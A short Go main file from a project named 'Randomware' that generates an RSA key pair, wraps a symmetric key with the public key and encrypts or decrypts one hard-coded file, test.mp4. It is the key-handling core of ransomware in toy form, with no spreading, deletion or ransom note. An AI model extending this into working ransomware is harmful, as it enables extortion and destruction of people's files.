package main

import (
	"Randomware/encryption"
	"Randomware/encryption/keys"
	"Randomware/file"
	"fmt"
	"log"
)

func main() {
	if false {
		privateKey, publicKey := keys.GenerateKeyPair(4096)
		file.BytesToNewFile("rsa_public_key.pub", keys.PublicKeyToBytes(publicKey))
		file.BytesToNewFile("rsa_private_key.priv", keys.PrivateKeyToBytes(privateKey))
		//Encrypt file
		key := encryption.GenKey()
		fmt.Println(key, '\n')
		file.BytesToNewFile("safe_key", keys.EncryptWithPublicKey(key, publicKey))
		file, err := file.Encrypt("test.mp4", key)
		if err != nil {
			log.Fatal(err)
		}

		fmt.Println(file)
	} else {
		encryptedKey, err := file.BytesFromFile("safe_key")
		if err != nil {
			log.Fatal(err)
		}
		privateKeyBytes, err := file.BytesFromFile("rsa_private_key.priv")
		if err != nil {
			log.Fatal(err)
		}
		privateKey := keys.BytesToPrivateKey(privateKeyBytes)
		key := keys.DecryptWithPrivateKey(encryptedKey, privateKey)
		file, err := file.Decrypt("test.mp4.ec", key)
		if err != nil {
			log.Fatal(err)
		}

		fmt.Println(file)
	}

}
